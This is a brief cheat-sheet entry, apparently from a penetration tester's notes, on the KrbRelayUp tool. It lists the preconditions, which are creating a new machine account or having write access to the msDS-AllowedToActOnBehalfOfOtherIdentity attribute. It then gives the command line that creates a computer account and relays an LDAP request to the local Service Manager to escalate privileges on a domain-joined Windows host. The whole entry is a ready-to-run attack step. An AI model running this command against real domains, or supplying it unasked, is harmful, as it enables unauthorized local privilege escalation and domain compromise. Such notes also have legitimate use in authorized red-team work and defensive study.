### Source
https://github.com/Dec0ne/KrbRelayUp

### Requirements
```
- New machine account creation
- Or
- Erite access to msDS-AllowedToActOnBehalfOfOtherIdentity attribute
```

### Create new maschine account, relay ldap request to local Service Manager 
```
.\KrbRelayUp relay -Domain <domain> -CreateNewComputerAccount -ComputerName <name> -ComputerPassword <password>
```

